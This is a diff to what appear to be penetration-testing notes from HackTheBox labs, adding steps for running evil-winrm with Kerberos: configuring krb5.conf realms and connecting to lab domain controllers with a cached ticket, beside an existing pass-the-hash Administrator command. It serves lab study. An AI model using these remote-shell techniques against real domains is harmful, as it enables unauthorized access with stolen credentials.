@@ -46,4 +46,70 @@ proxychains evil-winrm -i 172.16.5.5 -u INLANEFREIGHT.LOCAL\\Administrator -H 88
 ```
 
 
+## Evil-Winrm with kerberos
 
+
+```
+# From the kali machine make sure that we have krb5-user installed
+sudo apt-get install krb5-user -y
+
+# Set default realm and realm to the domain
+cat /etc/kbr5.conf
+# Output should be adapted to something like this (the comments with # are mine):
+# [libdefaults]
+#         default_realm = INLANEFREIGHT.HTB
+# 
+# <SNIP>
+# 
+# [realms]
+#     INLANEFREIGHT.HTB = {
+#        kdc = dc01.inlanefreight.htb
+#    }
+#
+# <SNIP>
+
+# And now we can use Evil-WinRm
+proxychains evil-winrm -i dc01 -r inlanefreight.htb
+# i: specifies the target host or IP address (in this case, dc01) that the evil-winrm command will attempt to connect to.
+# -r: This flag specifies the domain of the target system.
+```
+
+
+Example from [HTB machine: Voleur](htb-voleur.md).
+
+The `/etc/krb5.conf` is:
+
+```
+[libdefaults]
+  default_realm = VOLEUR.HTB
+  dns_lookup_realm = false
+  dns_lookup_kdc = false
+
+[realms]
+  AD.TRILOCOR.LOCAL = {
+    kdc = 172.16.139.3
+    admin_server = 172.16.139.3
+  }
+  VOLEUR.HTB = {
+    kdc = dc.voleur.htb
+    admin_server = dc.voleur.htb
+  }
+
+[domain_realm]
+  .ad.trilocor.local = AD.TRILOCOR.LOCAL
+  ad.trilocor.local = AD.TRILOCOR.LOCAL
+  .voleur.htb = VOLEUR.HTB
+  voleur.htb = VOLEUR.HTB
+```
+
+And the evil-winrm command:
+
+```bash
+evil-winrm -i dc.voleur.htb -k svc_winrm.ccache -r voleur.htb
+```
+
+Where: 
+- -i dc.voleur.htb: target host (FQDN required for Kerberos so the SPN is `HTTP/dc.voleur.htb`).  
+- -r VOLEUR.HTB:  Kerberos realm (must also exist in `/etc/krb5.conf` with KDC mapping). 
+- `KRB5CCNAME=/path/to/svc_winrm.ccache` → path to the **ccache** that holds your TGT for the account  (e.g., `svc_winrm`). Evil-winrm will pick it up automatically.
+    
